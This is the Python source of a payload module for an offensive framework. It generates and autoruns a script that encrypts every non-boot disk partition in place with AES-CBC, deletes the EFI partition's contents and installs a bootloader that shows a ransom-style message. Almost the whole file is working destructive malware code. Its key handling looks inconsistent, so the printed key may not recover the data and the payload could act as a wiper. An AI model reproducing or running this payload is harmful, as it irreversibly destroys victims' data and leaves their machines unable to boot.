"""
Payload that encrypts the disk with AES-CBC, leaving the ESP alone. 
Then install an EFI file as the bootloader which shows a message letting
the user know their disk has been encrypted and a custom message.
"""

import os
import shutil
import random

from libsnr.util.common_utils import print_ok, print_warning, rootfs_open
from libsnr.util.payloads.autorun import Autorun
from snr.variables import global_vars

LICENSE = "Apache-2.0"
AUTHORS = ["GlobularOne"]
INPUTS = (
    "IV", "KEY", "MESSAGE"
)

ONLINE = True

DEB_DEPENDENCIES = ("python3-pycryptodome",)

PAYLOAD = r"""#!/usr/bin/python3
import os
import platform
import shutil

from libsnr.payload.safety_pin import require_lack_of_safety_pin
from libsnr.payload.storage import query_all_block_info, get_partition_root
from libsnr.payload.context import create_context_for_mountpoint
from libsnr.util.programs.mount import Mount
from libsnr.util.programs.umount import Umount
from libsnr.util.common_utils import print_ok, print_info, print_error
from Cryptodome.Cipher import AES

KEY = "@KEY@".encode()
IV = "@IV@".encode()
MESSAGE = "@MESSAGE@"

FS_MOUNTPOINT = "/mnt"

PATHS_TO_CHECK = (
    "/mnt/EFI/BOOT/BOOTX64.EFI",
    "/mnt/EFI/BOOT/BOOTI32.EFI",
    "/mnt/EFI/BOOT/Microsoft/BOOTMGFW.EFI",
    "/mnt/EFI/debian",
    "/mnt/EFI/Microsoft"
)


def encrypt_device(info: dict):
    print_info(f"Encrypting {info['UUID']}... (0/{info['size']})", end="")
    aes = AES.new(KEY, AES.MODE_CBC, IV)
    with open(info["path"], "r+b") as stream:
        encrypted_size = 0
        while encrypted_size < info["size"]:
            data = aes.encrypt(stream.read(AES.block_size))
            stream.seek(encrypted_size)
            stream.write(data)
            encrypted_size += AES.block_size
            print_info(
                f"\rEncrypting {info['UUID']}... ({encrypted_size}/{info['size']})", end="")
    print_info(
        f"\rEncrypting {info['UUID']}... ({encrypted_size}/{info['size']}: Done)")


def main():
    require_lack_of_safety_pin()
    block_info = query_all_block_info()
    # We don't care about LVM
    print_info("Efi_disk_encryption payload started")
    context = create_context_for_mountpoint("/")
    if context is None:
        print_error("Creating context for / failed")
        return

    our_device = get_partition_root(context["device"], block_info)
    if our_device is None:
        print_error("Finding partition root device for / failed")
        return

    for device in block_info:
        if device != our_device:
            if "children" in device:
                for child in device["children"]:
                    # Mount it to see if it's the ESP or not
                    errorcode = Mount().invoke_and_wait(
                        None, child["path"], FS_MOUNTPOINT)
                    if errorcode != 0:
                        print_info(
                            f"Failed to mount '{child['path']}'! Assuming it's not the ESP")
                        # Encrypt it anyway
                        encrypt_device(child)
                        continue
                    for path in PATHS_TO_CHECK:
                        if os.path.exists(path):
                            break
                    else:
                        if len(os.listdir("/mnt/EFI")) == 0 or os.path.exists("/mnt/boot") or os.path.exists("/mnt/Windows"):
                            # Not the ESP
                            Umount().invoke_and_wait(None, FS_MOUNTPOINT)
                            encrypt_device(child)
                            continue
                    print_info("Installing to ESP")
                    shutil.rmtree("/mnt/EFI")
                    os.makedirs("/mnt/EFI/BOOT")
                    shutil.copy("/root/BOOTX64.EFI",
                                "/mnt/EFI/BOOT/BOOTX64.EFI")
                    shutil.copy("/root/BOOTI32.EFI",
                                "/mnt/EFI/BOOT/BOOTI32.EFI")
                    with open("/mnt/EFI/BOOT/message.txt", "w") as stream:
                        stream.write(MESSAGE)
                    if platform.machine() == "x86_64":
                        bootloader = "BOOTX64.EFI"
                    else:
                        bootloader = "BOOTI32.EFI"
                    os.mkdir("/mnt/EFI/Microsoft")
                    shutil.copy(f"/root/{bootloader}",
                                "/mnt/EFI/Microsoft/BOOTMGFW.EFI")
                    with open("/mnt/EFI/Microsoft/message.txt", "w") as stream:
                        stream.write(MESSAGE)
                    Umount().invoke_and_wait(None, FS_MOUNTPOINT)
    print_ok("Efi_disk_encryption payload completed")


if __name__ == "__main__":
    main()
"""


def load():
    global_vars.set_variable(
        "MESSAGE", "", 1024, "Custom additional message to show"
    )


def unload():
    for inp in INPUTS:
        global_vars.del_variable(inp)


def generate(context: dict):
    print_warning("Generating a random IV! Ensure you take note of it")
    iv = random.SystemRandom().randbytes(16)
    print_ok(f"Your IV is: {iv.hex()}")

    print_warning("Generating a random key! Ensure you take note of it")
    key_raw = random.SystemRandom().randbytes(32)
    print_ok(f"Your key is: {key_raw.hex()}")

    payload = PAYLOAD
    with rootfs_open(context, "root/efi_disk_encrypt.py", "w") as stream:
        for inp in INPUTS:
            value = global_vars.get_variable(inp)
            payload = payload.replace(f"@{inp}@", f"{repr(value)}")
        stream.write(payload)
    shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTX64.EFI"), os.path.join(context["temp_dir"], "root", "BOOTX64.EFI"))
    shutil.copy(os.path.join(os.path.dirname(__file__), "data", "BOOTI32.EFI"), os.path.join(context["temp_dir"], "root", "BOOTI32.EFI"))
    autorun = Autorun(context)
    autorun.add_executable("/root/efi_disk_encrypt.py")
